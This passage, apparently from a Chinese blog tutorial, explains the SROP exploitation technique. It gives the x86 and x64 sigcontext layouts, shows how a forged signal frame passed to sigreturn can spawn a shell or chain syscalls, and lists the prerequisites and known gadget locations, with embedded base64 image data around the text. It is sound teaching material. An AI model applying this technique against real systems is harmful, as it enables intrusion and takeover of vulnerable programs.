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)

对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext

x86

```c
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```

x64

```c
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```

signal     handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。

**攻击原理**

仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：

- Signal  Frame被保存在用户的地址空间中，所以用户是可以读写的。
- 由于内核与信号处理程序无关(kernel     agnostic about signal handlers)，它并不会去记录这个signal对应的Signal     Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。

说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。

**获取shell**

首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息

当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。

**system call chains**

需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可

- **控制栈指针。**
- **把原来rip指向的syscall     gadget换成syscall; ret gadget。**

如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。

**后续**

需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件

- **可以通过栈溢出来控制栈的内容**

- **需要知道相应的地址**

- - **"/bin/sh"**
  - **Signal      Frame**
  - **syscal**
  - **sigreturn**

- 需要有够大的空间来塞下整个sigal     frame

此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：



并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux < 3.3 x86_64（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&return代码片段。如下

![gadget1](data:image/png;base64,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